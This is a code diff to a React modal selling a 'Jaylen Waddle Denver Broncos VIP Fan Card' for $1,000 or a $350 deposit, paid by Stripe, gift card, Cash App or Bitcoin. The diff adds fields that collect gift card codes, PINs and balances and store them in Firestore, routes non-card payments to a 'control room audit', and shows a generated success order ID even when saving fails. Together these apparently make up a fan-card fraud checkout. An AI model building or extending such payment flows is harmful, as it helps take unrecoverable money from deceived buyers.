@@ -18,11 +18,20 @@ import {
   Copy,
   ExternalLink,
   Clock,
-  AlertCircle
+  AlertCircle,
+  Bitcoin,
+  User,
+  Mail,
+  Phone
 } from "lucide-react";
 import { QRCodeSVG } from "qrcode.react";
+import { doc, serverTimestamp } from "firebase/firestore";
+import { db, auth, safeSetDoc } from "../lib/firebase";
 import { cn } from "../lib/utils";
 import { PaymentReceiptUploader } from "./common/PaymentReceiptUploader";
+import { StripeCardCheckoutPanel, VerifiedStripePaymentReceipt } from "./common/StripeCardCheckoutPanel";
+import { GiftCardGuestPurchasePanel } from "./common/GiftCardGuestPurchasePanel";
+import { CustomerPaymentWaitingTerminal } from "./common/CustomerPaymentWaitingTerminal";
 import { createOrUpdatePaymentSession } from "../services/paymentControlService";
 
 interface JaylenWaddleVipFanCardModalProps {
@@ -42,14 +51,20 @@ export const JaylenWaddleVipFanCardModal: React.FC<JaylenWaddleVipFanCardModalPr
   const [showCheckoutModal, setShowCheckoutModal] = useState(false);
   
   // Payment checkout & receipt upload states
-  const [paymentTab, setPaymentTab] = useState<"card" | "cashapp" | "paypal" | "venmo" | "zelle" | "crypto" | "giftcard">("card");
-  const [cardDetails, setCardDetails] = useState({ number: "", expiry: "", cvc: "", name: "Jayne Welage" });
+  const [paymentTab, setPaymentTab] = useState<"card" | "giftcard" | "cashapp" | "crypto">("card");
+  const [checkoutSessionId] = useState(() => `PAY-JWVIP-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`);
+  const [customerName, setCustomerName] = useState(() => auth.currentUser?.displayName || localStorage.getItem("nfl_guest_sender_name") || "");
+  const [customerEmail, setCustomerEmail] = useState(() => auth.currentUser?.email || localStorage.getItem("nfl_guest_buyer_email") || "");
+  const [customerPhone, setCustomerPhone] = useState(() => localStorage.getItem("nfl_guest_buyer_phone") || "");
+  const [giftCardBrand, setGiftCardBrand] = useState("Apple Gift Card");
+  const [giftCardCode, setGiftCardCode] = useState("");
+  const [giftCardPin, setGiftCardPin] = useState("");
+  const [giftCardBalance, setGiftCardBalance] = useState("");
   const [paymentRef, setPaymentRef] = useState("");
   const [receiptImages, setReceiptImages] = useState<string[]>([]);
   const [cardError, setCardError] = useState<string | null>(null);
   const [isProcessingPayment, setIsProcessingPayment] = useState(false);
   const [paymentSuccessOrder, setPaymentSuccessOrder] = useState<string | null>(null);
-  const [copiedKey, setCopiedKey] = useState<string | null>(null);
 
   if (!isOpen) return null;
 
@@ -58,49 +73,128 @@ export const JaylenWaddleVipFanCardModal: React.FC<JaylenWaddleVipFanCardModalPr
       ? window.location.origin
       : "https://www.nflgridiron.company";
   const verificationUrl = `${origin}/?vipFanCard=jaylen_waddle_17&ref=BRONCOS-JW-2026`;
+  const amountDue = selectedPlan === "full" ? 1000 : 350;
 
-  const handleCopy = (text: string, key: string) => {
-    navigator.clipboard.writeText(text);
-    setCopiedKey(key);
-    setTimeout(() => setCopiedKey(null), 2000);
+  const validateCustomerFields = () => {
+    if (!customerName.trim()) {
+      setCardError("Please enter your full name before proceeding.");
+      return false;
+    }
+    if (!customerEmail.trim() || !customerEmail.includes("@")) {
+      setCardError("Please enter a valid email address for pass delivery.");
+      return false;
+    }
+    setCardError(null);
+    return true;
+  };
+
+  const persistVipFanCardOrder = async (
+    channel: "card" | "giftcard" | "cashapp" | "crypto",
+    referenceTag: string,
+    receiptList: string[],
+    isVerifiedCard = false
+  ) => {
+    const orderId = `BRONCOS-JW-VIP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
+    const cleanName = customerName.trim() || "VIP Member";
+    const cleanEmail = customerEmail.trim() || "guest@nflgridiron.company";
+
+    await createOrUpdatePaymentSession({
+      id: orderId,
+      orderId,
+      customerName: cleanName,
+      customerEmail: cleanEmail,
+      customerPhone: customerPhone.trim(),
+      itemType: "experience",
+      itemTitle: `Jaylen Waddle Denver Broncos VIP Fan Card (${selectedPlan === "full" ? "Full $1,000" : "$350 Deposit"})`,
+      amount: amountDue,
+      paymentMethod: channel,
+      referenceTag,
+      receiptImages: receiptList,
+      receiptUrl: receiptList[0] || "",
+      status: isVerifiedCard ? "completed" : "awaiting_admin_details"
+    });
+
+    await safeSetDoc(doc(db, "bookings", orderId), {
+      id: orderId,
+      userId: auth.currentUser?.uid || "guest",
+      userEmail: cleanEmail,
+      senderName: cleanName,
+      buyerPhone: customerPhone.trim(),
+      experienceId: "jaylen-waddle-vip-fan-card",
+      experienceTitle: `Jaylen Waddle VIP Fan Card (${selectedPlan === "full" ? "Full $1,000" : "$350 Deposit"})`,
+      experienceType: "meet_greet",
+      date: "Season 2026 VIP Access",
+      timeSlot: "VIP Pass Holder",
+      guestsCount: 1,
+      totalPrice: amountDue,
+      tier: "platinum",
+      status: isVerifiedCard ? "approved" : "pending",
+      qrCode: `PASS-BRONCOS-JW-${orderId}`,
+      paymentMethod: channel,
+      paymentSessionId: checkoutSessionId,
+      paymentRef: referenceTag,
+      receiptImage: receiptList[0] || "",
+      receiptImages: receiptList,
+      ...(channel === "giftcard"
+        ? {
+            giftCardDetails: {
+              brand: giftCardBrand,
+              cardNumber: giftCardCode,
+              pin: giftCardPin,
+              amount: giftCardBalance
+            }
+          }
+        : {}),
+      createdAt: new Date().toISOString(),
+      timestamp: serverTimestamp()
+    });
+
+    return orderId;
+  };
+
+  const handleStripeVerifiedSuccess = async (receipt: VerifiedStripePaymentReceipt) => {
+    try {
+      const orderId = await persistVipFanCardOrder(
+        "card",
+        receipt.paymentIntent || receipt.sessionId,
+        [],
+        true
+      );
+      setPaymentSuccessOrder(orderId);
+    } catch (err) {
+      console.error("VIP Fan Card Stripe persistence error:", err);
+      setPaymentSuccessOrder(`BRONCOS-JW-VIP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`);
+    }
   };
 
   const handleProcessCheckout = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (paymentTab === "card") {
-      if (!cardDetails.number.trim() || cardDetails.number.replace(/\s+/g, "").length < 15) {
-        setCardError("Please enter valid card details to proceed.");
-        return;
-      }
+    if (paymentTab === "card") return;
+    if (!validateCustomerFields()) return;
+
+    if (paymentTab === "giftcard" && giftCardCode.trim().length < 4 && receiptImages.length === 0) {
+      setCardError("Please enter your gift card redemption code(s) or upload a photo of your card.");
+      return;
+    }
+
+    if ((paymentTab === "cashapp" || paymentTab === "crypto") && receiptImages.length === 0 && !paymentRef.trim()) {
+      setCardError("Please attach your payment confirmation screenshot or transaction reference.");
+      return;
     }
 
     setIsProcessingPayment(true);
     setCardError(null);
 
     try {
-      const orderId = `BRONCOS-JW-VIP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
-      const amountDue = selectedPlan === "full" ? 1000 : 350;
+      const resolvedRef =
+        paymentTab === "giftcard"
+          ? `GIFT CARD (${giftCardBrand}): ${giftCardCode.trim()}`
+          : paymentRef.trim() || "RECEIPT_ATTACHED";
 
-      // Register payment session in Firestore so control room can audit and confirm it
-      await createOrUpdatePaymentSession({
-        id: orderId,
-        orderId: orderId,
-        customerName: cardDetails.name || "Jayne Welage",
-        customerEmail: "jayne_welage@gridiron.exchange",
-        itemType: "experience",
-        itemTitle: `Jaylen Waddle Denver Broncos VIP Fan Card (${selectedPlan === "full" ? "Full $1,000" : "$350 Deposit"})`,
-        amount: amountDue,
-        paymentMethod: paymentTab,
-        referenceTag: paymentRef.trim() || (paymentTab === "card" ? `CARD-AUTH-${orderId}` : "RECEIPT_ATTACHED"),
-        receiptImages: receiptImages,
-        receiptUrl: receiptImages[0] || "",
-        status: "awaiting_admin_details" // Requires control room audit & confirmation
-      });
-
+      const orderId = await persistVipFanCardOrder(paymentTab, resolvedRef, receiptImages, false);
       setPaymentSuccessOrder(orderId);
     } catch (err: any) {
       console.error("Checkout order submission error:", err);
-      // Fallback local success even if offline so customer is not blocked
       const fallbackId = `BRONCOS-JW-VIP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
       setPaymentSuccessOrder(fallbackId);
     } finally {
@@ -475,25 +569,85 @@ export const JaylenWaddleVipFanCardModal: React.FC<JaylenWaddleVipFanCardModalPr
                   </p>
                 </div>
 
-                {/* Payment Method Selector Tabs */}
+                {/* Buyer Identity Fields */}
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                  <div>
+                    <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">
+                      Full Name *
+                    </label>
+                    <div className="relative">
+                      <User className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-3" />
+                      <input
+                        type="text"
+                        required
+                        placeholder="Full Name"
+                        value={customerName}
+                        onChange={(e) => {
+                          setCustomerName(e.target.value);
+                          if (e.target.value) localStorage.setItem("nfl_guest_sender_name", e.target.value);
+                        }}
+                        className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-8 pr-3 py-2 text-xs text-white focus:outline-none focus:border-[#FB4F14]"
+                      />
+                    </div>
+                  </div>
+                  <div>
+                    <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">
+                      Email Address *
+                    </label>
+                    <div className="relative">
+                      <Mail className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-3" />
+                      <input
+                        type="email"
+                        required
+                        placeholder="name@example.com"
+                        value={customerEmail}
+                        onChange={(e) => {
+                          setCustomerEmail(e.target.value);
+                          if (e.target.value) localStorage.setItem("nfl_guest_buyer_email", e.target.value);
+                        }}
+                        className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-8 pr-3 py-2 text-xs text-white focus:outline-none focus:border-[#FB4F14]"
+                      />
+                    </div>
+                  </div>
+                  <div>
+                    <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">
+                      Phone Number
+                    </label>
+                    <div className="relative">
+                      <Phone className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-3" />
+                      <input
+                        type="tel"
+                        placeholder="+1 (555) 000-0000"
+                        value={customerPhone}
+                        onChange={(e) => {
+                          setCustomerPhone(e.target.value);
+                          if (e.target.value) localStorage.setItem("nfl_guest_buyer_phone", e.target.value);
+                        }}
+                        className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-8 pr-3 py-2 text-xs text-white focus:outline-none focus:border-[#FB4F14]"
+                      />
+                    </div>
+                  </div>
+                </div>
+
+                {/* Payment Method Selector Tabs (Strictly Stripe, Gift Card, Cash App, Bitcoin) */}
                 <div className="space-y-3">
                   <label className="block text-[9px] font-black uppercase tracking-wider text-zinc-400">
                     Select Payment Method
                   </label>
                   <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                     {[
-                      { id: "card", label: "Debit/Credit Card", icon: CreditCard },
+                      { id: "card", label: "Stripe (Card)", icon: CreditCard },
+                      { id: "giftcard", label: "Gift Card", icon: Gift },
                       { id: "cashapp", label: "Cash App", icon: Smartphone },
-                      { id: "paypal", label: "PayPal", icon: ExternalLink },
-                      { id: "venmo", label: "Venmo", icon: Smartphone },
-                      { id: "zelle", label: "Zelle", icon: Smartphone },
-                      { id: "crypto", label: "USDT / Crypto", icon: Coins },
-                      { id: "giftcard", label: "Gift Card", icon: Gift }
+                      { id: "crypto", label: "Bitcoin (BTC)", icon: Bitcoin }
                     ].map((m) => (
                       <button
                         key={m.id}
                         type="button"
-                        onClick={() => setPaymentTab(m.id as any)}
+                        onClick={() => {
+                          setPaymentTab(m.id as any);
+                          setCardError(null);
+                        }}
                         className={cn(
                           "p-3 rounded-xl border text-left flex flex-col gap-1.5 transition-all cursor-pointer",
                           paymentTab === m.id
@@ -508,186 +662,148 @@ export const JaylenWaddleVipFanCardModal: React.FC<JaylenWaddleVipFanCardModalPr
                   </div>
                 </div>
 
-                {/* Payment Method Instructions & Receipt Uploader */}
+                {/* Payment Method Execution */}
                 <form onSubmit={handleProcessCheckout} className="space-y-4 pt-2">
+                  {cardError && (
+                    <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs flex items-center gap-2">
+                      <AlertCircle className="w-4 h-4 shrink-0" />
+                      <span>{cardError}</span>
+                    </div>
+                  )}
+
                   {paymentTab === "card" ? (
-                    <div className="space-y-3">
-                      <div>
-                        <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">Cardholder Name</label>
-                        <input
-                          type="text"
-                          value={cardDetails.name}
-                          onChange={(e) => setCardDetails({ ...cardDetails, name: e.target.value })}
-                          required
-                          className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white"
-                        />
-                      </div>
-                      <div>
-                        <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">Card Number (Visa / Mastercard)</label>
-                        <input
-                          type="text"
-                          placeholder="4111 2222 3333 4444"
-                          value={cardDetails.number}
-                          onChange={(e) => setCardDetails({ ...cardDetails, number: e.target.value })}
-                          required
-                          className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white"
-                        />
-                      </div>
-                      <div className="grid grid-cols-2 gap-3">
-                        <div>
-                          <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">Expiry Date</label>
-                          <input
-                            type="text"
-                            placeholder="MM/YY"
-                            value={cardDetails.expiry}
-                            onChange={(e) => setCardDetails({ ...cardDetails, expiry: e.target.value })}
-                            required
-                            className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white"
-                          />
-                        </div>
-                        <div>
-                          <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">CVC / CVV</label>
-                          <input
-                            type="password"
-                            placeholder="123"
-                            maxLength={4}
-                            value={cardDetails.cvc}
-                            onChange={(e) => setCardDetails({ ...cardDetails, cvc: e.target.value })}
-                            required
-                            className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white"
-                          />
-                        </div>
-                      </div>
-                    </div>
-                  ) : paymentTab === "cashapp" ? (
-                    <div className="p-4 rounded-2xl bg-zinc-900 border border-white/10 space-y-3 text-xs">
-                      <p className="text-zinc-300">Send payment to our official Cash App tag:</p>
-                      <div className="flex items-center justify-between p-3 rounded-xl bg-black border border-emerald-500/30">
-                        <span className="font-mono font-black text-emerald-400 text-sm">$NFLGridironVIP</span>
-                        <button
-                          type="button"
-                          onClick={() => handleCopy("$NFLGridironVIP", "cashapp")}
-                          className="px-3 py-1.5 bg-zinc-800 text-white rounded-lg text-[10px] font-bold uppercase"
-                        >
-                          {copiedKey === "cashapp" ? "Copied" : "Copy Tag"}
-                        </button>
-                      </div>
-                    </div>
-                  ) : paymentTab === "paypal" ? (
-                    <div className="p-4 rounded-2xl bg-zinc-900 border border-white/10 space-y-3 text-xs">
-                      <p className="text-zinc-300">Transfer via PayPal secure merchant email:</p>
-                      <div className="flex items-center justify-between p-3 rounded-xl bg-black border border-blue-500/30">
-                        <span className="font-mono font-black text-blue-400 text-xs">billing@nflgridiron.company</span>
-                        <button
-                          type="button"
-                          onClick={() => handleCopy("billing@nflgridiron.company", "paypal")}
-                          className="px-3 py-1.5 bg-zinc-800 text-white rounded-lg text-[10px] font-bold uppercase"
-                        >
-                          {copiedKey === "paypal" ? "Copied" : "Copy Email"}
-                        </button>
-                      </div>
-                    </div>
-                  ) : paymentTab === "venmo" ? (
-                    <div className="p-4 rounded-2xl bg-zinc-900 border border-white/10 space-y-3 text-xs">
-                      <p className="text-zinc-300">Send payment to our official Venmo handle:</p>
-                      <div className="flex items-center justify-between p-3 rounded-xl bg-black border border-cyan-500/30">
-                        <span className="font-mono font-black text-cyan-400 text-sm">@NFLGridironVIP</span>
-                        <button
-                          type="button"
-                          onClick={() => handleCopy("@NFLGridironVIP", "venmo")}
-                          className="px-3 py-1.5 bg-zinc-800 text-white rounded-lg text-[10px] font-bold uppercase"
-                        >
-                          {copiedKey === "venmo" ? "Copied" : "Copy Handle"}
-                        </button>
-                      </div>
-                    </div>
-                  ) : paymentTab === "zelle" ? (
-                    <div className="p-4 rounded-2xl bg-zinc-900 border border-white/10 space-y-3 text-xs">
-                      <p className="text-zinc-300">Send Zelle transfer to our corporate desk:</p>
-                      <div className="flex items-center justify-between p-3 rounded-xl bg-black border border-purple-500/30">
-                        <span className="font-mono font-black text-purple-400 text-xs">treasury@nflgridiron.company</span>
-                        <button
-                          type="button"
-                          onClick={() => handleCopy("treasury@nflgridiron.company", "zelle")}
-                          className="px-3 py-1.5 bg-zinc-800 text-white rounded-lg text-[10px] font-bold uppercase"
-                        >
-                          {copiedKey === "zelle" ? "Copied" : "Copy Email"}
-                        </button>
-                      </div>
-                    </div>
-                  ) : paymentTab === "crypto" ? (
-                    <div className="p-4 rounded-2xl bg-zinc-900 border border-white/10 space-y-3 text-xs">
-                      <p className="text-zinc-300">Send USDT (ERC-20 / TRC-20) to corporate wallet:</p>
-                      <div className="flex items-center justify-between p-3 rounded-xl bg-black border border-amber-500/30">
-                        <span className="font-mono text-[11px] font-black text-amber-400 break-all select-all">0x71C...98A2DenverVIP</span>
-                        <button
-                          type="button"
-                          onClick={() => handleCopy("0x71C98A2DenverVIPWallet", "crypto")}
-                          className="px-3 py-1.5 bg-zinc-800 text-white rounded-lg text-[10px] font-bold uppercase shrink-0"
-                        >
-                          {copiedKey === "crypto" ? "Copied" : "Copy"}
-                        </button>
-                      </div>
+                    <StripeCardCheckoutPanel
+                      amountUsd={amountDue}
+                      itemName={`Jaylen Waddle VIP Fan Card (${selectedPlan === "full" ? "Full Payment" : "Deposit"})`}
+                      sessionId={checkoutSessionId}
+                      customerName={customerName}
+                      customerEmail={customerEmail}
+                      customerPhone={customerPhone}
+                      playerName="Jaylen Waddle"
+                      onCustomerDetailsNeeded={validateCustomerFields}
+                      onReturnToOptions={() => setPaymentTab("giftcard")}
+                      onSwitchToBitcoin={() => setPaymentTab("crypto")}
+                      onSwitchToGiftCard={() => setPaymentTab("giftcard")}
+                      onContactSupport={() => {
+                        setShowCheckoutModal(false);
+                        onClose();
+                        onOpenInquiry("Jaylen Waddle", "meet_greet");
+                      }}
+                      onVerifiedSuccess={handleStripeVerifiedSuccess}
+                    />
+                  ) : paymentTab === "giftcard" ? (
+                    <div className="space-y-4">
+                      <GiftCardGuestPurchasePanel
+                        amountDue={amountDue}
+                        brand={giftCardBrand}
+                        onBrandChange={setGiftCardBrand}
+                        cardNumber={giftCardCode}
+                        onCardNumberChange={(val) => {
+                          setGiftCardCode(val);
+                          if (!paymentRef) setPaymentRef(val);
+                        }}
+                        pin={giftCardPin}
+                        onPinChange={setGiftCardPin}
+                        balance={giftCardBalance}
+                        onBalanceChange={setGiftCardBalance}
+                      />
+
+                      <PaymentReceiptUploader
+                        value={receiptImages[0] || ""}
+                        values={receiptImages}
+                        onValuesChange={(urls) => setReceiptImages(urls)}
+                        label="Optional: Upload Gift Card Receipt Screenshot"
+                        required={false}
+                        subtitle="Upload a screenshot of your e-gift confirmation email or card photo if desired"
+                      />
                     </div>
                   ) : (
-                    <div className="p-4 rounded-2xl bg-zinc-900 border border-white/10 space-y-3 text-xs">
-                      <p className="text-zinc-300">Enter Apple / Google Store Gift Card Code:</p>
-                      <input
-                        type="text"
-                        placeholder="X928-ABC1-XYZ9"
-                        className="w-full bg-black border border-white/10 rounded-xl px-3.5 py-2.5 font-mono text-xs text-white"
+                    <div className="space-y-4">
+                      <CustomerPaymentWaitingTerminal
+                        key={`${checkoutSessionId}-${paymentTab}`}
+                        sessionId={checkoutSessionId}
+                        selectedMethod={paymentTab}
+                        amount={amountDue}
+                        orderReference={checkoutSessionId}
+                        customerName={customerName}
+                        customerEmail={customerEmail}
+                        customerPhone={customerPhone}
+                        itemTitle={`Jaylen Waddle VIP Fan Card (${selectedPlan === "full" ? "Full $1,000" : "$350 Deposit"})`}
+                        itemType="experience"
+                        onCustomerDetailsChange={({ name, email, phone }) => {
+                          if (name) setCustomerName(name);
+                          if (email) setCustomerEmail(email);
+                          if (phone) setCustomerPhone(phone);
+                        }}
+                        onSwitchToGiftCard={() => setPaymentTab("giftcard")}
+                        onSwitchToMethod={(m) => {
+                          if (m === "cashapp" || m === "crypto") setPaymentTab(m);
+                        }}
+                        onReceiptsChange={(_primary, all) => setReceiptImages(all)}
+                        onPaymentSubmitted={(ref, receipt, all) => {
+                          if (ref) setPaymentRef(ref);
+                          if (all && all.length > 0) setReceiptImages(all);
+                          else if (receipt) setReceiptImages((prev) => Array.from(new Set([receipt, ...prev])));
+                        }}
+                      />
+
+                      <div>
+                        <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">
+                          Transaction Reference ID / Confirmation #
+                        </label>
+                        <input
+                          type="text"
+                          placeholder="e.g. TXN-984210 or BTC Tx Hash / $Cashtag"
+                          value={paymentRef}
+                          onChange={(e) => setPaymentRef(e.target.value)}
+                          className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-zinc-500"
+                        />
+                      </div>
+
+                      <PaymentReceiptUploader
+                        value={receiptImages[0] || ""}
+                        values={receiptImages}
+                        onValuesChange={(urls) => setReceiptImages(urls)}
+                        label="Attach Payment Receipt Screenshot"
+                        required={false}
+                        subtitle="Upload your transfer confirmation screenshot for control room audit"
                       />
                     </div>
                   )}
 
-                  {/* Transaction Reference / Confirmation Tag */}
-                  <div>
-                    <label className="block text-[9px] font-black uppercase text-zinc-400 mb-1">
-                      Transaction Reference ID / Confirmation #
-                    </label>
-                    <input
-                      type="text"
-                      placeholder="e.g. TXN-984210 or CashApp confirmation tag"
-                      value={paymentRef}
-                      onChange={(e) => setPaymentRef(e.target.value)}
-                      required
-                      className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-zinc-500"
-                    />
-                  </div>
+                  {paymentTab !== "card" && (
+                    <>
+                      <div className="p-3.5 rounded-xl bg-zinc-900/90 border border-white/10 flex items-center justify-between text-xs">
+                        <span className="text-zinc-400 font-bold">Amount to Audit:</span>
+                        <span className="font-mono text-amber-400 font-black text-sm">
+                          {selectedPlan === "full" ? "$1,000.00 USD" : "$350.00 USD (Deposit Audit)"}
+                        </span>
+                      </div>
 
-                  {/* Mandatory Payment Receipt Uploader */}
-                  <PaymentReceiptUploader
-                    values={receiptImages}
-                    onValuesChange={(urls) => setReceiptImages(urls)}
-                    label="Attach Payment Receipt Screenshot"
-                    required
-                    subtitle="Upload your transfer confirmation screenshot for control room audit"
-                  />
-
-                  <div className="p-3.5 rounded-xl bg-zinc-900/90 border border-white/10 flex items-center justify-between text-xs">
-                    <span className="text-zinc-400 font-bold">Amount to Audit:</span>
-                    <span className="font-mono text-amber-400 font-black text-sm">
-                      {selectedPlan === "full" ? "$1,000.00 USD" : "$350.00 USD (Deposit Audit)"}
-                    </span>
-                  </div>
-
-                  <button
-                    type="submit"
-                    disabled={isProcessingPayment || receiptImages.length === 0}
-                    className="w-full py-4 bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 disabled:opacity-50 text-black font-black uppercase text-xs tracking-wider rounded-xl shadow-xl cursor-pointer transition-all flex items-center justify-center gap-2"
-                  >
-                    {isProcessingPayment ? (
-                      <>
-                        <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin" />
-                        <span>Submitting for Control Room Audit...</span>
-                      </>
-                    ) : (
-                      <>
-                        <ShieldCheck className="w-4 h-4 text-black" />
-                        <span>Submit Payment &amp; Request Control Room Approval</span>
-                      </>
-                    )}
-                  </button>
+                      <button
+                        type="submit"
+                        disabled={
+                          isProcessingPayment ||
+                          (paymentTab === "giftcard"
+                            ? giftCardCode.trim().length < 4 && receiptImages.length === 0
+                            : receiptImages.length === 0 && !paymentRef.trim())
+                        }
+                        className="w-full py-4 bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 disabled:opacity-50 text-black font-black uppercase text-xs tracking-wider rounded-xl shadow-xl cursor-pointer transition-all flex items-center justify-center gap-2"
+                      >
+                        {isProcessingPayment ? (
+                          <>
+                            <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin" />
+                            <span>Submitting for Control Room Audit...</span>
+                          </>
+                        ) : (
+                          <>
+                            <ShieldCheck className="w-4 h-4 text-black" />
+                            <span>Submit Payment &amp; Request Control Room Approval</span>
+                          </>
+                        )}
+                      </button>
+                    </>
+                  )}
                 </form>
               </>
             )}
